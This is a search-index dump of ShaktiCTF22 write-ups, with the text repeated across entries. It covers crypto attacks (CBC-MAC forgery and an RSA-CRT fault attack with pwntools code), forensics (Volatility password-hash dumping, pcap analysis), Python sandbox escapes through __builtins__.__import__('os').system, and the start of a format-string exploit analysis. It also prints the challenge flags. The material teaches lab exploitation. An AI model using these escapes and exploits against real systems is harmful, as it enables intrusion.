io.recvline() tag1 = (io.recvline().decode())[:-1] sign funtion is returning the last 16 bytes from ct . sign(sign(block0) xor block1) gives the same sign value. (So, simply append the ciphertext of the previous block)","title":"host,port = '0.0.0.0',4304"},{"location":"ShaktiCTF22/crypto/d0uble_cbc/#flag","text":"shaktictf{double_cheese_double_mac_yummyyyy_4120686170707920636263206d6f6465}","title":"Flag"},{"location":"ShaktiCTF22/crypto/intro/","text":"Cryptography Challenge Name Level Author Eazy_peaZy Beginner Rees secRets_And_seCReTs Easy Rees cAex0r Easy b4b7gr00t d0uble_cbc Medium b4b7gr00t r3d33m_r4nd0m Hard b4b7gr00t","title":"Cryptography"},{"location":"ShaktiCTF22/crypto/intro/#cryptography","text":"Challenge Name Level Author Eazy_peaZy Beginner Rees secRets_And_seCReTs Easy Rees cAex0r Easy b4b7gr00t d0uble_cbc Medium b4b7gr00t r3d33m_r4nd0m Hard b4b7gr00t","title":"Cryptography"},{"location":"ShaktiCTF22/crypto/r3d33m_r4nd0m/","text":"r33d3m_rand0m Challenge Description : You know, everything is fair in CTFs and competition. Author b4b7gr00t Difficulty Level Hard Points 300 Flag format shaktictf{...} Writeup This is a simple Random faults attack which works with RSA decryption and signature verification with CRT. A signature can be built using CRTof Sp, Sq, Sr. Sp, Sq, and Sr are signatures of hash function with p,q, and r, respectively. ```py= p,q,r = getPrime(256),getPrime(256),getPrime(256) n = p q r e = 65537 phi = (p-1) (q-1) (r-1) d = inverse(e,phi) ct = pow(bytes_to_long(flag),e,n) h =int(sha256(flag).hexdigest(),16) dp = d%(p-1) dq = d%(q-1) dr = d%(r-1) sp = pow(h,dp,p) sq = pow(h,dq,q) sr = pow(h,dr,r) s = (((sp q r (inverse(q r,p)))%n) + (sq p r (inverse(p r,q)) %(n)) + ((sr p q (inverse((p q),r)))%n))%n `s` is the signature. Now, it is easy to find p,q,r,when the attacker has the full knowledge of `h`. If the signature is valid, i.e., `s^e mod N = h`, the attacker has a chance to manipulate `Sp, Sq and Sr` values. If you compute the signature using changed `Sp, Sq, and Sr` values, the verification fails. Now give faults Sp value, i.e., add some value to `Sp ( Sp+3 )` for first signature verification and don\u2019t change `Sq and Sr`. Calculate `gcd(S^e - h,n)`, which is equal to the `product of q and r`. In the same way, input `Sp, modified_Sq, Sr`, and get the `product of p and r`. Next, find the `product of p and q`. ```python= sp1 = sp+2 #create faults value one each time sq1 = sq+2 #create faults value sr1 = sr+2 io = remote(host,port) io.recvuntil(b'provided\\n') n = int(io.recvline()[4:-1]) e = int(io.recvline()[4:-1]) h = int(io.recvline()[4:-1]) io.recvuntil(b'values\\n') io.sendline('2') io.recvuntil(b'sp value: ') io.sendline(str(sp1)) io.recvuntil(b'sq value: ') io.sendline(str(sq)) io.recvuntil(b'sr value: ') io.sendline(str(sr)) qr = GCD((s**e)-h , n ) ```python= pr = GCD((s e)-h , n) pq = GCD((s e)-h , n) p = GCD(pq,pr) q = GCD(pq,qr) r = GCD(pr,qr) find `pq` and `pr` in the same way. Now find the `gcd(pq,pr),gcd(pq,qr) and gcd(pr,qr)` to get `p`,`q` and `r` values respectively. ```python= phi = (p-1)*(q-1)*(r-1) d = inverse(e,phi) pt = long_to_bytes(pow(ct,d,n)) print(pt) flag shaktictf{rand0m_cr4z7_p3rs0n_aLw4ys_tries_cr7pt0_a7de4873ca0f9f697f1d2c09004f33dc1ad98b64}","title":"R3d33m r4nd0m"},{"location":"ShaktiCTF22/crypto/r3d33m_r4nd0m/#r33d3m_rand0m","text":"","title":"r33d3m_rand0m"},{"location":"ShaktiCTF22/crypto/r3d33m_r4nd0m/#challenge-description","text":"You know, everything is fair in CTFs and competition.","title":"Challenge Description :"},{"location":"ShaktiCTF22/crypto/r3d33m_r4nd0m/#author","text":"b4b7gr00t","title":"Author"},{"location":"ShaktiCTF22/crypto/r3d33m_r4nd0m/#difficulty-level","text":"Hard","title":"Difficulty Level"},{"location":"ShaktiCTF22/crypto/r3d33m_r4nd0m/#points","text":"300","title":"Points"},{"location":"ShaktiCTF22/crypto/r3d33m_r4nd0m/#flag-format","text":"shaktictf{...}","title":"Flag format"},{"location":"ShaktiCTF22/crypto/r3d33m_r4nd0m/#writeup","text":"This is a simple Random faults attack which works with RSA decryption and signature verification with CRT. A signature can be built using CRTof Sp, Sq, Sr. Sp, Sq, and Sr are signatures of hash function with p,q, and r, respectively. ```py= p,q,r = getPrime(256),getPrime(256),getPrime(256) n = p q r e = 65537 phi = (p-1) (q-1) (r-1) d = inverse(e,phi) ct = pow(bytes_to_long(flag),e,n) h =int(sha256(flag).hexdigest(),16) dp = d%(p-1) dq = d%(q-1) dr = d%(r-1) sp = pow(h,dp,p) sq = pow(h,dq,q) sr = pow(h,dr,r) s = (((sp q r (inverse(q r,p)))%n) + (sq p r (inverse(p r,q)) %(n)) + ((sr p q (inverse((p q),r)))%n))%n `s` is the signature. Now, it is easy to find p,q,r,when the attacker has the full knowledge of `h`. If the signature is valid, i.e., `s^e mod N = h`, the attacker has a chance to manipulate `Sp, Sq and Sr` values. If you compute the signature using changed `Sp, Sq, and Sr` values, the verification fails. Now give faults Sp value, i.e., add some value to `Sp ( Sp+3 )` for first signature verification and don\u2019t change `Sq and Sr`. Calculate `gcd(S^e - h,n)`, which is equal to the `product of q and r`. In the same way, input `Sp, modified_Sq, Sr`, and get the `product of p and r`. Next, find the `product of p and q`. ```python= sp1 = sp+2 #create faults value one each time sq1 = sq+2 #create faults value sr1 = sr+2 io = remote(host,port) io.recvuntil(b'provided\\n') n = int(io.recvline()[4:-1]) e = int(io.recvline()[4:-1]) h = int(io.recvline()[4:-1]) io.recvuntil(b'values\\n') io.sendline('2') io.recvuntil(b'sp value: ') io.sendline(str(sp1)) io.recvuntil(b'sq value: ') io.sendline(str(sq)) io.recvuntil(b'sr value: ') io.sendline(str(sr)) qr = GCD((s**e)-h , n ) ```python= pr = GCD((s e)-h , n) pq = GCD((s e)-h , n) p = GCD(pq,pr) q = GCD(pq,qr) r = GCD(pr,qr) find `pq` and `pr` in the same way. Now find the `gcd(pq,pr),gcd(pq,qr) and gcd(pr,qr)` to get `p`,`q` and `r` values respectively. ```python= phi = (p-1)*(q-1)*(r-1) d = inverse(e,phi) pt = long_to_bytes(pow(ct,d,n)) print(pt)","title":"Writeup"},{"location":"ShaktiCTF22/crypto/r3d33m_r4nd0m/#flag","text":"shaktictf{rand0m_cr4z7_p3rs0n_aLw4ys_tries_cr7pt0_a7de4873ca0f9f697f1d2c09004f33dc1ad98b64}","title":"flag"},{"location":"ShaktiCTF22/crypto/secRetS/","text":"secRetS And seCReTs Challenge Description : I think Sun Tzu forgot that greater the number of primes used, stronger would be the encryption. Author Rees Difficulty Level Easy Points 100 Flag format shaktictf{...} Writeup The challenge uses crt and rsa to encrypt the flag. From the final assert statement provided in the source code it can be seen that the secret (which is given) when divided by an unknown value x, would give us the modulus that we require to perfrom RSA decryption. From the first assert statement we can infer that x can be retrieved by performing the chinese remainder theorem on the array n and c given using the crt function in the sympy module. from sympy.ntheory.modular import crt x=crt(n,c)[0] #x=175393906935410597646312735251121734825355066308014883020996453700680562811773639892091486800372429659125492317788178170078374593410001133290406346042424977949257610021473876645919378922293673885436422442069899845701280009009220968827934275876545186933778202134359447023530167415550308017091921680916413562203 Once x is retrieved, N can be found as secret//x N=secret//x #N=24527876714777610556168704102334063247745307067942987179946992203143782911214218738693269763284353107444558551004104842495208613554362680493609315262323088218069305109094883023250460622553819850578030167910933028392613333549556209547555445147475324578694902644739395420556980677634640744378713609298141891560253460328397733071122264628468706243972435551492706426936176969047044900758569383152320313902601091822535952698142154712130550473808314533625099780507036524949344974327532792045713711551245809959038345909568860198589805752319051021759477458800632328558389734253607892450861044270982742648526813361769154927281 From the hint we can understand the number of primes used to set our private key was less. So, on using sympy's factorint function we can see that n factorises into a squared prime. from sympy import factorint factorint(N) #{156613782007770984536049055700840395037085682399926189984796410929143868636172989598027406051641994725886674336805075334390044528511942285958708618671006005927130990180083143883853840126990685118290412751594654157367930730824790742241421921147161987915110899307344903473712967071752529319870067482601269289159: 2} #p=156613782007770984536049055700840395037085682399926189984796410929143868636172989598027406051641994725886674336805075334390044528511942285958708618671006005927130990180083143883853840126990685118290412751594654157367930730824790742241421921147161987915110899307344903473712967071752529319870067482601269289159 We can now calculate Euler's totient as p*(p-1) as N=p^2 phi=p*(p-1) #phi=24527876714777610556168704102334063247745307067942987179946992203143782911214218738693269763284353107444558551004104842495208613554362680493609315262323088218069305109094883023250460622553819850578030167910933028392613333549556209547555445147475324578694902644739395420556980677634640744378713609298141891560096846546389962086586215572767865848935349869092780236951380558117901032122396393554292907850959097096649278361337079377740505945296372247666391161836030519022213984147449648161859871424255124840747933157974206041221875021494260279518055537653470340643278834946262988977148077199230213328656745879167885638122 Using the inverse function we can calculate the private key d as inverse of e and euler's totient. ```python= from Crypto.Util.number import inverse d=inverse(e,phi) d=12976716501083114741505370666039473503350367456044481659067428485582257120108192415379278003301316436431713057341125275856941395818704200997221657812999197976488350337178187574426098557544724288250790240810164958625769902713944221640331262486815263578087009771595420257518229260351036796463724872594022823840933182176525919029375831248830129737097141858965988207513545296422203983807312665421181897156053905025132679686629545955176412753730886597545459522931179123030612104190678878354458814439067976007495812844445727544246548859732219763976525316341284726507536308407339008755430600740481089868997899657725988353611 pt_int can then be calculated by using `(ct^d)%N` ```python! pt_int=pow(ct,d,N) #pt_int= mpz(1058749935816526928514932347698586539511633166445946912656393573071070805207400525111857343067141631643689341) The flag can then be obtained on converting the pt_int value to bytes and decoding. from Crypto.Util.number import long_to_bytes flag=long_to_bytes(pt_int).decode() flag shaktictf{w0w_you_kn0w_h0w_RSA_&_CRT_w0rks_!}","title":"secRetS"},{"location":"ShaktiCTF22/crypto/secRetS/#secrets-and-secrets","text":"","title":"secRetS And seCReTs"},{"location":"ShaktiCTF22/crypto/secRetS/#challenge-description","text":"I think Sun Tzu forgot that greater the number of primes used, stronger would be the encryption.","title":"Challenge Description :"},{"location":"ShaktiCTF22/crypto/secRetS/#author","text":"Rees","title":"Author"},{"location":"ShaktiCTF22/crypto/secRetS/#difficulty-level","text":"Easy","title":"Difficulty Level"},{"location":"ShaktiCTF22/crypto/secRetS/#points","text":"100","title":"Points"},{"location":"ShaktiCTF22/crypto/secRetS/#flag-format","text":"shaktictf{...}","title":"Flag format"},{"location":"ShaktiCTF22/crypto/secRetS/#writeup","text":"The challenge uses crt and rsa to encrypt the flag. From the final assert statement provided in the source code it can be seen that the secret (which is given) when divided by an unknown value x, would give us the modulus that we require to perfrom RSA decryption. From the first assert statement we can infer that x can be retrieved by performing the chinese remainder theorem on the array n and c given using the crt function in the sympy module. from sympy.ntheory.modular import crt x=crt(n,c)[0] #x=175393906935410597646312735251121734825355066308014883020996453700680562811773639892091486800372429659125492317788178170078374593410001133290406346042424977949257610021473876645919378922293673885436422442069899845701280009009220968827934275876545186933778202134359447023530167415550308017091921680916413562203 Once x is retrieved, N can be found as secret//x N=secret//x #N=24527876714777610556168704102334063247745307067942987179946992203143782911214218738693269763284353107444558551004104842495208613554362680493609315262323088218069305109094883023250460622553819850578030167910933028392613333549556209547555445147475324578694902644739395420556980677634640744378713609298141891560253460328397733071122264628468706243972435551492706426936176969047044900758569383152320313902601091822535952698142154712130550473808314533625099780507036524949344974327532792045713711551245809959038345909568860198589805752319051021759477458800632328558389734253607892450861044270982742648526813361769154927281 From the hint we can understand the number of primes used to set our private key was less. So, on using sympy's factorint function we can see that n factorises into a squared prime. from sympy import factorint factorint(N) #{156613782007770984536049055700840395037085682399926189984796410929143868636172989598027406051641994725886674336805075334390044528511942285958708618671006005927130990180083143883853840126990685118290412751594654157367930730824790742241421921147161987915110899307344903473712967071752529319870067482601269289159: 2} #p=156613782007770984536049055700840395037085682399926189984796410929143868636172989598027406051641994725886674336805075334390044528511942285958708618671006005927130990180083143883853840126990685118290412751594654157367930730824790742241421921147161987915110899307344903473712967071752529319870067482601269289159 We can now calculate Euler's totient as p*(p-1) as N=p^2 phi=p*(p-1) #phi=24527876714777610556168704102334063247745307067942987179946992203143782911214218738693269763284353107444558551004104842495208613554362680493609315262323088218069305109094883023250460622553819850578030167910933028392613333549556209547555445147475324578694902644739395420556980677634640744378713609298141891560096846546389962086586215572767865848935349869092780236951380558117901032122396393554292907850959097096649278361337079377740505945296372247666391161836030519022213984147449648161859871424255124840747933157974206041221875021494260279518055537653470340643278834946262988977148077199230213328656745879167885638122 Using the inverse function we can calculate the private key d as inverse of e and euler's totient. ```python= from Crypto.Util.number import inverse d=inverse(e,phi)","title":"Writeup"},{"location":"ShaktiCTF22/crypto/secRetS/#d12976716501083114741505370666039473503350367456044481659067428485582257120108192415379278003301316436431713057341125275856941395818704200997221657812999197976488350337178187574426098557544724288250790240810164958625769902713944221640331262486815263578087009771595420257518229260351036796463724872594022823840933182176525919029375831248830129737097141858965988207513545296422203983807312665421181897156053905025132679686629545955176412753730886597545459522931179123030612104190678878354458814439067976007495812844445727544246548859732219763976525316341284726507536308407339008755430600740481089868997899657725988353611","text":"pt_int can then be calculated by using `(ct^d)%N` ```python! pt_int=pow(ct,d,N) #pt_int= mpz(1058749935816526928514932347698586539511633166445946912656393573071070805207400525111857343067141631643689341) The flag can then be obtained on converting the pt_int value to bytes and decoding. from Crypto.Util.number import long_to_bytes flag=long_to_bytes(pt_int).decode()","title":"d=12976716501083114741505370666039473503350367456044481659067428485582257120108192415379278003301316436431713057341125275856941395818704200997221657812999197976488350337178187574426098557544724288250790240810164958625769902713944221640331262486815263578087009771595420257518229260351036796463724872594022823840933182176525919029375831248830129737097141858965988207513545296422203983807312665421181897156053905025132679686629545955176412753730886597545459522931179123030612104190678878354458814439067976007495812844445727544246548859732219763976525316341284726507536308407339008755430600740481089868997899657725988353611"},{"location":"ShaktiCTF22/crypto/secRetS/#flag","text":"shaktictf{w0w_you_kn0w_h0w_RSA_&_CRT_w0rks_!}","title":"flag"},{"location":"ShaktiCTF22/forensics/fishy/","text":"Fishy File Challenge Description We have got a confidential file from a criminal's system but we're unable to retrieve anything from the file. Can you help us? Challenge Author v1Ru5 Writeup The given file is a pdf file where the bytes are reversed. The first step is to change the file extension. Let's now write a script to get the actual pdf file. f1 = open(\"flag.pdf\", \"w\") with open(\"shakti.pdf\", \"r\") as myfile: data = myfile.read() rev = data[::-1] f1.write(rev) f1.close() Binwalk command shows us that a pdf and an image file are embedded in flag.pdf. Let's extract the files using the following command. foremost flag.pdf The extracted pdf file is a rabbit hole. We only get a fake flag. So let's now focus on the png file. The extracted png file is corrupted. Fix IHDR, IDAT and IEND chunks to get the flag. Flag shaktictf{Y0Uuu_G0t_Th1Ss5}","title":"Fishy File"},{"location":"ShaktiCTF22/forensics/fishy/#fishy-file","text":"","title":"Fishy File"},{"location":"ShaktiCTF22/forensics/fishy/#challenge-description","text":"We have got a confidential file from a criminal's system but we're unable to retrieve anything from the file. Can you help us?","title":"Challenge Description"},{"location":"ShaktiCTF22/forensics/fishy/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF22/forensics/fishy/#writeup","text":"The given file is a pdf file where the bytes are reversed. The first step is to change the file extension. Let's now write a script to get the actual pdf file. f1 = open(\"flag.pdf\", \"w\") with open(\"shakti.pdf\", \"r\") as myfile: data = myfile.read() rev = data[::-1] f1.write(rev) f1.close() Binwalk command shows us that a pdf and an image file are embedded in flag.pdf. Let's extract the files using the following command. foremost flag.pdf The extracted pdf file is a rabbit hole. We only get a fake flag. So let's now focus on the png file. The extracted png file is corrupted. Fix IHDR, IDAT and IEND chunks to get the flag.","title":"Writeup"},{"location":"ShaktiCTF22/forensics/fishy/#flag","text":"shaktictf{Y0Uuu_G0t_Th1Ss5}","title":"Flag"},{"location":"ShaktiCTF22/forensics/follow/","text":"Follow up Challenge Description My friend has been trying to send me some file and it got lost in the traffic. Can you help me retrieve it? Write up Open the pcap in wireshark Filter out the TCP packets Right click on any of the TCP packets and follow it Save the PNG as raw file and rename it to .png and that gives the flag Flag shaktictf{that_was_e4sy!} Author rayst4rk","title":"Follow up"},{"location":"ShaktiCTF22/forensics/follow/#follow-up","text":"","title":"Follow up"},{"location":"ShaktiCTF22/forensics/follow/#challenge-description","text":"My friend has been trying to send me some file and it got lost in the traffic. Can you help me retrieve it?","title":"Challenge Description"},{"location":"ShaktiCTF22/forensics/follow/#write-up","text":"Open the pcap in wireshark Filter out the TCP packets Right click on any of the TCP packets and follow it Save the PNG as raw file and rename it to .png and that gives the flag","title":"Write up"},{"location":"ShaktiCTF22/forensics/follow/#flag","text":"shaktictf{that_was_e4sy!}","title":"Flag"},{"location":"ShaktiCTF22/forensics/follow/#author","text":"rayst4rk","title":"Author"},{"location":"ShaktiCTF22/forensics/intro/","text":"Forensics Challenge Name Level Author Concept Follow Up Easy rayst4rk Network Fishy File Easy v1Ru5 File Mission 1 Medium v1Ru5 Memory Mission 2 Hard v1Ru5 Memory Follow The Malice Hard rayst4rk Network","title":"Forensics"},{"location":"ShaktiCTF22/forensics/intro/#forensics","text":"Challenge Name Level Author Concept Follow Up Easy rayst4rk Network Fishy File Easy v1Ru5 File Mission 1 Medium v1Ru5 Memory Mission 2 Hard v1Ru5 Memory Follow The Malice Hard rayst4rk Network","title":"Forensics"},{"location":"ShaktiCTF22/forensics/malice/","text":"Follow the malice Challenge Description My friend has been sending me some wierd site names.But I think she is trying to tell me something. Can you figure it out? Write up Open the pcap in wireshark Filter out the evil packets by applying the filter ip.flag.rb==1 On analysing the filtered packets, at the end of each query name we can see the flag Flag shaktictf{be1ng_ev1L_hAs_a_pr1ce} Author rayst4rk","title":"Follow the malice"},{"location":"ShaktiCTF22/forensics/malice/#follow-the-malice","text":"","title":"Follow the malice"},{"location":"ShaktiCTF22/forensics/malice/#challenge-description","text":"My friend has been sending me some wierd site names.But I think she is trying to tell me something. Can you figure it out?","title":"Challenge Description"},{"location":"ShaktiCTF22/forensics/malice/#write-up","text":"Open the pcap in wireshark Filter out the evil packets by applying the filter ip.flag.rb==1 On analysing the filtered packets, at the end of each query name we can see the flag","title":"Write up"},{"location":"ShaktiCTF22/forensics/malice/#flag","text":"shaktictf{be1ng_ev1L_hAs_a_pr1ce}","title":"Flag"},{"location":"ShaktiCTF22/forensics/malice/#author","text":"rayst4rk","title":"Author"},{"location":"ShaktiCTF22/forensics/mission1/","text":"Mission 1 Challenge Description You are a forensics investigator hired by a private comapny to gather proofs against an ex-employee who secretly worked for the rival company and was fired later. This memory dump was taken from the ex-employee's system. Answer the following questions as a part of your mission: What is the sha1 hash of Challenge.raw? What is the user password of TroubleMaker's account? What is the PID of the program used to capture the image? Challenge Author v1Ru5 Writeup The first part of the challenge is pretty easy. This gives us the sha1 hash of the challenge file. sha1sum Challenge.raw We use volatility for the remaining part of the challenge. To start with, we use imageinfo to find the profile of the given memory dump. To get the user password, we use \"hashdump\" plugin and crack TroubleMaker's password hash using crackstation. We get the password as \"londonbridge\". volatility -f Challenge.raw --profile=Win7SP1x64 hashdump To get the last part of the flag, we use pslist plugin which lists out all the processes that were running during the memory capture. Dumpit was the tool used for image capture and the corresponding PID is 636. Flag shaktictf{ed85ee47484e503787277807d3ef999586aecf1b_londonbridge_636}","title":"Mission 1"},{"location":"ShaktiCTF22/forensics/mission1/#mission-1","text":"","title":"Mission 1"},{"location":"ShaktiCTF22/forensics/mission1/#challenge-description","text":"You are a forensics investigator hired by a private comapny to gather proofs against an ex-employee who secretly worked for the rival company and was fired later. This memory dump was taken from the ex-employee's system. Answer the following questions as a part of your mission: What is the sha1 hash of Challenge.raw? What is the user password of TroubleMaker's account? What is the PID of the program used to capture the image?","title":"Challenge Description"},{"location":"ShaktiCTF22/forensics/mission1/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF22/forensics/mission1/#writeup","text":"The first part of the challenge is pretty easy. This gives us the sha1 hash of the challenge file. sha1sum Challenge.raw We use volatility for the remaining part of the challenge. To start with, we use imageinfo to find the profile of the given memory dump. To get the user password, we use \"hashdump\" plugin and crack TroubleMaker's password hash using crackstation. We get the password as \"londonbridge\". volatility -f Challenge.raw --profile=Win7SP1x64 hashdump To get the last part of the flag, we use pslist plugin which lists out all the processes that were running during the memory capture. Dumpit was the tool used for image capture and the corresponding PID is 636.","title":"Writeup"},{"location":"ShaktiCTF22/forensics/mission1/#flag","text":"shaktictf{ed85ee47484e503787277807d3ef999586aecf1b_londonbridge_636}","title":"Flag"},{"location":"ShaktiCTF22/forensics/mission2/","text":"Mission 2 Challenge Description What was the confidential information that he was going to leak before getting fired? Challenge Author v1Ru5 Writeup This is the continuation of Mission 1. Using pslist plugin gives us a clue about the processes running in the system at the time of memory capture i.e Command Prompt (conhost.exe) and Internet Explorer (iexplore.exe). volatility -f Challenge.raw --profile=Win7SP1x64 pslist Let's try to see the commands entered by the user using cmdscan. We get a base64 encoded string that gives us the word \"victory\" after decoding. This can be a password/key that might be required in this challenge. Since we see a command \"type hint.txt\" entered in the command prompt, let's extract the output of this command using consoles plugin. We get another string \"p4sSworD@51073#912\". We have already noticed that the user opened Internet Explorer at the time of image capture. So let's now use iehistory plugin. We get a locked pastebin link. Unlocking it using \"p4sSworD@51073#912\" directs us to a password protected RAR file. The password of the RAR file is same as the password of TroubleMaker's account i.e \"londonbridge\". We get the flag by decrypting the string present in flag.txt using Vigenere Cipher Decoder and using \"victory\" as the key. Flag shaktictf{y4Yyy!_M1S5i0n_4cCoMpL1sH3D}","title":"Mission 2"},{"location":"ShaktiCTF22/forensics/mission2/#mission-2","text":"","title":"Mission 2"},{"location":"ShaktiCTF22/forensics/mission2/#challenge-description","text":"What was the confidential information that he was going to leak before getting fired?","title":"Challenge Description"},{"location":"ShaktiCTF22/forensics/mission2/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF22/forensics/mission2/#writeup","text":"This is the continuation of Mission 1. Using pslist plugin gives us a clue about the processes running in the system at the time of memory capture i.e Command Prompt (conhost.exe) and Internet Explorer (iexplore.exe). volatility -f Challenge.raw --profile=Win7SP1x64 pslist Let's try to see the commands entered by the user using cmdscan. We get a base64 encoded string that gives us the word \"victory\" after decoding. This can be a password/key that might be required in this challenge. Since we see a command \"type hint.txt\" entered in the command prompt, let's extract the output of this command using consoles plugin. We get another string \"p4sSworD@51073#912\". We have already noticed that the user opened Internet Explorer at the time of image capture. So let's now use iehistory plugin. We get a locked pastebin link. Unlocking it using \"p4sSworD@51073#912\" directs us to a password protected RAR file. The password of the RAR file is same as the password of TroubleMaker's account i.e \"londonbridge\". We get the flag by decrypting the string present in flag.txt using Vigenere Cipher Decoder and using \"victory\" as the key.","title":"Writeup"},{"location":"ShaktiCTF22/forensics/mission2/#flag","text":"shaktictf{y4Yyy!_M1S5i0n_4cCoMpL1sH3D}","title":"Flag"},{"location":"ShaktiCTF22/misc/intro/","text":"Misc writeups Challenge Name Level Author pyjails Easy-Medium Claire de lune","title":"Intro"},{"location":"ShaktiCTF22/misc/intro/#misc-writeups","text":"Challenge Name Level Author pyjails Easy-Medium Claire de lune","title":"Misc writeups"},{"location":"ShaktiCTF22/misc/pyjails/","text":"Shaktictf 22 write-ups pyjails - level0,level1 and endgame level0 Description: Solve level0 of the pyjail series! Note: The server is running on Ubuntu 22.04. Flag format: shakti{} Author: Claire de lune Intended solution The intended solution is to use the __builtins__ module to access the import function and read the flag. Running the file gives us the following output: On trying to import the os module, we get the following error: Which means the import function has been blocked somehow. So we try to access the __builtins__ module and import the os module from there. Exploit __builtins__.__import__('os').system('cat flag.txt') ``` This gives us the flag: `shakti{7h47_w45_7Un!3a36rgjsk9}` ### level1 Description: Solve level1 of the pyjail series! Note: The server is running on Ubuntu 22.04. Flag format: shakti{} Author: Claire de lune ### Intended solution The intended solution is to use globals() to find the `__builtins__` module and access the `import` function to read the flag. Running the file gives us the following output: ![](https://i.imgur.com/a0KytYg.png) On trying to run the last exploit, we get the following error: ![](https://i.imgur.com/oO3eyPR.png) Which means the `__builtins__` module has been blocked somehow. So we try to access the `__builtins__` module using globals().Running globals() gives us the following output: ![](https://i.imgur.com/PtoKmTV.png) We can see that the `__builtins__.__import__` module is present in the globals() dictionary. So we try to import the os module from there. #### Exploit ```python we_need_you_alive.('os').system('cat flag.txt') ``` This displays the message: ![](https://i.imgur.com/j1sojOZ.png) The flag is : `shakti{7h47_W45_4_Cl053_C4ll!!!}` ### endgame Description: Solve endgame of the pyjail series! Note: The server is running on Ubuntu 22.04. Flag format: shakti{} Author: Claire de lune ### Intended solution The intended solution is to use globals() to find the `__builtins__` module and access the `import os` function to read the flag.Also the exec function has been blocked. Running the file gives us the following output: ![](https://i.imgur.com/AT7ASIx.png) Let's try using the helpline: ![](https://i.imgur.com/SAfMEP2.png) So the helpline id is the password in the message that was displayed at the end of the last game. The helpline is basically globals() function which shows the banned list containing the functions: print, exec, eval,read,open and globals(). It also shows the os module saved as 'sos' and exec function saved as 'beat_the_master'. #### Exploit ```python= beat_the_master('sos.system(\"cat flag.txt\")') This displays the message: The flag is: shakti{H0w_D0_y0u_L1k3_35c4p3_r00m5_n0W?}","title":"Shaktictf 22 write-ups"},{"location":"ShaktiCTF22/misc/pyjails/#shaktictf-22-write-ups","text":"","title":"Shaktictf 22 write-ups"},{"location":"ShaktiCTF22/misc/pyjails/#pyjails-level0level1-and-endgame","text":"","title":"pyjails - level0,level1 and endgame"},{"location":"ShaktiCTF22/misc/pyjails/#level0","text":"Description: Solve level0 of the pyjail series! Note: The server is running on Ubuntu 22.04. Flag format: shakti{} Author: Claire de lune","title":"level0"},{"location":"ShaktiCTF22/misc/pyjails/#intended-solution","text":"The intended solution is to use the __builtins__ module to access the import function and read the flag. Running the file gives us the following output: On trying to import the os module, we get the following error: Which means the import function has been blocked somehow. So we try to access the __builtins__ module and import the os module from there.","title":"Intended solution"},{"location":"ShaktiCTF22/misc/pyjails/#exploit","text":"__builtins__.__import__('os').system('cat flag.txt') ``` This gives us the flag: `shakti{7h47_w45_7Un!3a36rgjsk9}` ### level1 Description: Solve level1 of the pyjail series! Note: The server is running on Ubuntu 22.04. Flag format: shakti{} Author: Claire de lune ### Intended solution The intended solution is to use globals() to find the `__builtins__` module and access the `import` function to read the flag. Running the file gives us the following output: ![](https://i.imgur.com/a0KytYg.png) On trying to run the last exploit, we get the following error: ![](https://i.imgur.com/oO3eyPR.png) Which means the `__builtins__` module has been blocked somehow. So we try to access the `__builtins__` module using globals().Running globals() gives us the following output: ![](https://i.imgur.com/PtoKmTV.png) We can see that the `__builtins__.__import__` module is present in the globals() dictionary. So we try to import the os module from there. #### Exploit ```python we_need_you_alive.('os').system('cat flag.txt') ``` This displays the message: ![](https://i.imgur.com/j1sojOZ.png) The flag is : `shakti{7h47_W45_4_Cl053_C4ll!!!}` ### endgame Description: Solve endgame of the pyjail series! Note: The server is running on Ubuntu 22.04. Flag format: shakti{} Author: Claire de lune ### Intended solution The intended solution is to use globals() to find the `__builtins__` module and access the `import os` function to read the flag.Also the exec function has been blocked. Running the file gives us the following output: ![](https://i.imgur.com/AT7ASIx.png) Let's try using the helpline: ![](https://i.imgur.com/SAfMEP2.png) So the helpline id is the password in the message that was displayed at the end of the last game. The helpline is basically globals() function which shows the banned list containing the functions: print, exec, eval,read,open and globals(). It also shows the os module saved as 'sos' and exec function saved as 'beat_the_master'. #### Exploit ```python= beat_the_master('sos.system(\"cat flag.txt\")') This displays the message: The flag is: shakti{H0w_D0_y0u_L1k3_35c4p3_r00m5_n0W?}","title":"Exploit"},{"location":"ShaktiCTF22/pwn/intro/","text":"Binary Exploitation Challenge Name Level Author play to win Easy Claire de lune guess the key Easy Claire de lune racing_cars Medium d1g174l_f0rtr355 game_of_thrones Medium d1g174l_f0rtr355 ropework Hard d1g174l_f0rtr355 phrack_crack Hard d1g174l_f0rtr355","title":"Binary Exploitation"},{"location":"ShaktiCTF22/pwn/intro/#binary-exploitation","text":"Challenge Name Level Author play to win Easy Claire de lune guess the key Easy Claire de lune racing_cars Medium d1g174l_f0rtr355 game_of_thrones Medium d1g174l_f0rtr355 ropework Hard d1g174l_f0rtr355 phrack_crack Hard d1g174l_f0rtr355","title":"Binary Exploitation"},{"location":"ShaktiCTF22/pwn/game_of_thrones/writeup/","text":"game_of_thrones Author: d1g174l_f0rtr355 Solves: 10 Difficulty: Medium Preliminary Analysis: As we can see, the binary given to us is a 64-bit non-stripped file with the following checks enabled. Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Since all the basic security checks are enabled, there is little we can do to think about the approach. Hence let's start debugging and analyzing. One may make of the decompilers such as Ghidra/ IDA to decompile the binary as there was no source code given at the time of the CTF. I have used IDA in my decompilation. Understanding the challenge At first glance we find a few functions present in the binary such as use_dragons , kings_landing , and white_walkers that are of interest to us. Let's take a look at each of these functions to understand what is going on. use_dragons: Upon entering option 1 , main redirects us to this function where we observe a very crucial fortmat string bug in the program. This happens beacuse printf usually takes in 2 arguments. The first one being a format specifier, and the second one being the variable whose data or address needs to be printed out. Looking at the decompiled code below it is obvious that since the only argument given to printf() is the varible buffer which is user controlled, we can very well take advantage of this bug and cause various memory leaks in the program. However, since we are only taking 10 characters of input string, it may not be enough to overwrite any data. printf(\"\\n\\nYou currently have %d number of dragons.\\n\", 3LL); printf(\"\\nSay something in Valyrian: \"); __isoc99_scanf(\"%10s\", buffer); getchar(); printf(\"The dragons say: \"); printf(buffer); return 3LL; kings_landing: This function presents us with a switch case like scenario, wherein if we choose option 1 , we simply get a message saying No men left in the army! You cannot kill the knight king. and the men is made 0. However, option 2 , firstly checks if the dragons count is between 1 and 3, if so it then asks us how many dragons we wish to use. Here we find another similar format_string type bug. This time we can also read in more characters (upto 50). if ( choice == 49 ) { puts(\"No men left in the army! You cannot kill the 